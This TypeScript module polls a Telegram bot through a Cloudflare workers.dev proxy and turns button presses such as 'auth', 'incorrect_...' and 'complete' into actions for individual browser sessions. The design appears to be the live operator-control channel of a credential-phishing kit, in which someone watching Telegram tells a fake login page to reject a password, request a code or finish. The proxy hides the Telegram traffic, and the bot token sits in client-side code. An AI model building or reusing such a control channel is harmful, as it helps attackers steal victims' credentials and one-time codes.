// Optimized Telegram Callback Service
// Fixed performance issues and reduced API calls

import { getSession } from "./telegram-service-enhanced";

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";
const TELEGRAM_API_BASE =
  "https://telegram-proxy-fragrant-fog-f09d.anthonynoelmills.workers.dev";

interface CallbackHandler {
  sessionId: string;
  onCallback: (action: string) => void;
  registeredAt: number;
  lastUsed: number;
}

class OptimizedTelegramCallbackService {
  private handlers = new Map<string, CallbackHandler>();
  private isPolling = false;
  private pollInterval: NodeJS.Timeout | null = null;
  private currentPollDelay = 2000; // Increased from 500ms
  private lastUpdateId = 0;
  private consecutiveErrors = 0;
  private maxErrors = 5;
  private processingCommands = new Set<string>();
  private lastCallbackTime = new Map<string, number>(); // Prevent callback spam

  /**
   * Register a callback handler with optimization
   */
  registerHandler(sessionId: string, onCallback: (action: string) => void) {
    const timestamp = Date.now();

    // Check if handler already exists
    if (this.handlers.has(sessionId)) {
      console.log("ℹ️ Updating existing handler:", sessionId);
    } else {
      console.log("📝 Registering new handler:", sessionId);
    }

    this.handlers.set(sessionId, {
      sessionId,
      onCallback,
      registeredAt: timestamp,
      lastUsed: timestamp,
    });

    console.log("✅ Handler registered. Total:", this.handlers.size);

    // Start polling only if not already started
    if (!this.isPolling && this.handlers.size > 0) {
      this.startPolling();
    }

    // Clean up old handlers every 5 registrations
    if (this.handlers.size % 5 === 0) {
      this.cleanupOldHandlers();
    }
  }

  /**
   * Start polling with exponential backoff
   */
  async startPolling() {
    if (this.isPolling) return;

    console.log("🔄 Starting optimized polling...");
    this.isPolling = true;
    this.consecutiveErrors = 0;
    this.currentPollDelay = 2000; // Start with 2 seconds

    try {
      // Clear webhook first
      await this.clearWebhook();
      this.pollForUpdates();
    } catch (error) {
      console.error("❌ Failed to start polling:", error);
      this.isPolling = false;
    }
  }

  /**
   * Stop polling
   */
  stopPolling() {
    console.log("🛑 Stopping polling");
    this.isPolling = false;

    if (this.pollInterval) {
      clearTimeout(this.pollInterval);
      this.pollInterval = null;
    }
  }

  /**
   * Optimized polling with better error handling
   */
  private async pollForUpdates() {
    if (!this.isPolling) return;

    try {
      const response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/getUpdates?` +
          `offset=${this.lastUpdateId + 1}&limit=10&timeout=30`,
        {
          method: "GET",
          signal: AbortSignal.timeout(35000), // 35 second timeout
        },
      );

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const data = await response.json();

      if (data.ok && data.result && data.result.length > 0) {
        console.log(`📡 Received ${data.result.length} updates`);

        for (const update of data.result) {
          this.lastUpdateId = update.update_id;

          if (update.callback_query) {
            await this.handleCallback(update.callback_query);
          }
        }
      }

      // Reset error count on success
      this.consecutiveErrors = 0;
      this.currentPollDelay = Math.max(2000, this.currentPollDelay * 0.9); // Gradually reduce delay
    } catch (error) {
      this.consecutiveErrors++;
      console.error(
        `❌ Polling error (${this.consecutiveErrors}/${this.maxErrors}):`,
        error.message,
      );

      // Exponential backoff
      this.currentPollDelay = Math.min(30000, this.currentPollDelay * 1.5);

      // Stop polling if too many consecutive errors
      if (this.consecutiveErrors >= this.maxErrors) {
        console.error("❌ Too many errors, stopping polling");
        this.stopPolling();
        return;
      }
    }

    // Schedule next poll if still active
    if (this.isPolling) {
      this.scheduleNextPoll();
    }
  }

  /**
   * Handle callback with anti-spam protection
   */
  private async handleCallback(callback: any) {
    const callbackData = callback.data;
    const callbackId = callback.id;

    // Anti-spam: Check if we've processed this callback recently
    const lastTime = this.lastCallbackTime.get(callbackId) || 0;
    const now = Date.now();

    if (now - lastTime < 1000) {
      // 1 second cooldown
      console.log("🚫 Callback ignored due to spam protection");
      return;
    }

    this.lastCallbackTime.set(callbackId, now);

    // Parse callback data
    const parts = callbackData.split("_");
    if (parts.length < 2) {
      console.error("❌ Invalid callback format:", callbackData);
      return;
    }

    let action: string;
    let sessionId: string;

    if (parts[0] === "auth") {
      action = parts[1];
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "incorrect") {
      action = `incorrect_${parts[1]}`;
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "complete") {
      action = "complete";
      sessionId = parts.slice(2).join("_");
    } else {
      console.error("❌ Unknown callback action:", callbackData);
      return;
    }

    console.log("🎯 Processing callback:", { action, sessionId });

    // Check if session is processing
    if (this.processingCommands.has(sessionId)) {
      console.warn("⚠️ Session busy, ignoring callback");
      return;
    }

    // Find handler
    const handler = this.handlers.get(sessionId);
    if (!handler) {
      console.error("❌ No handler for session:", sessionId);
      // Don't send answerCallbackQuery for missing sessions to reduce API calls
      return;
    }

    // Lock session
    this.processingCommands.add(sessionId);

    try {
      // Send confirmation (but don't await to avoid blocking)
      this.answerCallbackQuery(callbackId, `✅ Processing ${action}...`).catch(
        (err) => {
          // Silently handle answerCallbackQuery errors to reduce log spam
          if (!err.message.includes("400")) {
            console.warn("⚠️ Failed to answer callback:", err.message);
          }
        },
      );

      // Process callback
      handler.lastUsed = Date.now();
      handler.onCallback(action);

      console.log("✅ Callback processed:", sessionId);
    } catch (error) {
      console.error("❌ Callback processing error:", error);
    } finally {
      // Always unlock session
      this.processingCommands.delete(sessionId);
    }
  }

  /**
   * Answer callback query without blocking
   */
  private async answerCallbackQuery(callbackQueryId: string, text: string) {
    if (!this.validateToken()) return;

    try {
      await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false,
          }),
          signal: AbortSignal.timeout(5000), // 5 second timeout
        },
      );
    } catch (error) {
      // Don't log 400 errors as they're common and not critical
      if (!error.message.includes("400")) {
        throw error;
      }
    }
  }

  /**
   * Schedule next poll with current delay
   */
  private scheduleNextPoll() {
    this.pollInterval = setTimeout(() => {
      this.pollForUpdates();
    }, this.currentPollDelay);
  }

  /**
   * Clean up old handlers (older than 15 minutes)
   */
  private cleanupOldHandlers() {
    const fifteenMinutesAgo = Date.now() - 15 * 60 * 1000;
    let cleaned = 0;

    for (const [sessionId, handler] of this.handlers.entries()) {
      if (handler.registeredAt < fifteenMinutesAgo) {
        this.handlers.delete(sessionId);
        this.processingCommands.delete(sessionId);
        cleaned++;
      }
    }

    if (cleaned > 0) {
      console.log(`🧹 Cleaned ${cleaned} old handlers`);
    }

    // Stop polling if no handlers
    if (this.handlers.size === 0 && this.isPolling) {
      this.stopPolling();
    }
  }

  /**
   * Clear webhook to avoid conflicts
   */
  private async clearWebhook() {
    if (!this.validateToken()) return;

    try {
      await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook?drop_pending_updates=true`,
        { method: "POST", signal: AbortSignal.timeout(10000) },
      );
      console.log("✅ Webhook cleared");
    } catch (error) {
      console.warn("⚠️ Failed to clear webhook:", error.message);
    }
  }

  /**
   * Unregister handler with cleanup
   */
  unregisterHandler(sessionId: string) {
    console.log("🗑️ Unregistering handler:", sessionId);

    this.handlers.delete(sessionId);
    this.processingCommands.delete(sessionId);

    // Clean up callback time tracking
    for (const [callbackId, time] of this.lastCallbackTime.entries()) {
      if (Date.now() - time > 60000) {
        // Clean entries older than 1 minute
        this.lastCallbackTime.delete(callbackId);
      }
    }

    console.log("✅ Handler removed. Remaining:", this.handlers.size);

    // Stop polling if no handlers
    if (this.handlers.size === 0) {
      this.stopPolling();
    }
  }

  /**
   * Validate bot token
   */
  private validateToken(): boolean {
    return !!(TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN");
  }

  /**
   * Get debug info
   */
  getDebugInfo() {
    return {
      isPolling: this.isPolling,
      handlerCount: this.handlers.size,
      currentDelay: this.currentPollDelay,
      consecutiveErrors: this.consecutiveErrors,
      lastUpdateId: this.lastUpdateId,
      processingCount: this.processingCommands.size,
    };
  }
}

// Create singleton
const optimizedTelegramCallbackService = new OptimizedTelegramCallbackService();

// Export optimized functions
export const registerOptimizedCallback = (
  sessionId: string,
  onCallback: (action: string) => void,
): void => {
  optimizedTelegramCallbackService.registerHandler(sessionId, onCallback);
};

export const unregisterOptimizedCallback = (sessionId: string): void => {
  optimizedTelegramCallbackService.unregisterHandler(sessionId);
};

export const getTelegramDebugInfo = () => {
  return optimizedTelegramCallbackService.getDebugInfo();
};

export { optimizedTelegramCallbackService };
